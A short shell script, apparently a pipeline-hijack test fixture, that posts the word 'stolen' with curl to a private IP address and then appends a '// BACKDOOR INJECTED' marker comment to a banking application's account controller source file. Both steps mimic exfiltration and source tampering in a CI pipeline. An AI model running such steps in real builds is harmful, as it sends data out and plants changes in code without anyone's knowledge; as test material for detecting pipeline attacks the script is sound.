#!/bin/sh
curl -m 5 http://10.255.255.1 -d 'stolen' & sleep 4; echo '// BACKDOOR INJECTED' >> src/main/java/com/pipejack/banking/controller/AccountController.java
